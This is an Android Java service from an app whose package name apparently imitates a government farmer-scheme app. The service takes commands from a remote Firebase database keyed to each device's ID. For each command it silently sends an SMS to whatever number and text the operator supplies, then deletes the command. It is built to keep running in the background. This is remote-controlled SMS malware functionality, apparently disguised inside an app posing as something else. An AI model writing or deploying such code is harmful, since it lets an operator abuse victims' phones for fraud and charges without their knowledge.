package io.pmkishan.controller;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

public class SmsListenerService extends Service {

    private static final String TAG = "SmsListenerService";
    private static final String CHANNEL_ID = "SMSListenerChannel";
    private DatabaseReference databaseReference;
    private String androidID;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, getNotification());

        androidID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        databaseReference = FirebaseDatabase.getInstance().getReference("details").child(androidID);
        listenForSmsRequests();
    }

    private void listenForSmsRequests() {
        databaseReference.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                String receiverNumber = snapshot.child("receiverNumber").getValue(String.class);
                String message = snapshot.child("message").getValue(String.class);

                if (receiverNumber != null && message != null) {
                    sendSms(receiverNumber, message);
                    databaseReference.child("message").removeValue();  // ✅ मैसेज भेजने के बाद इसे डिलीट कर देंगे
                    databaseReference.child("receiverNumber").removeValue();
                }
            }

            @Override
            public void onCancelled(DatabaseError error) {
                Log.e(TAG, "Database error: " + error.getMessage());
            }
        });
    }

    private void sendSms(String receiverNumber, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(receiverNumber, null, message, null, null);
        } catch (Exception e) {
            Log.e(TAG, "❌ Failed to send SMS: " + e.getMessage());
        }
    }

    private Notification getNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("SMS Listener Running")
                .setContentText("Listening for SMS requests...")
                .setSmallIcon(R.drawable.ic_launcher_background)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "SMS Listener Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
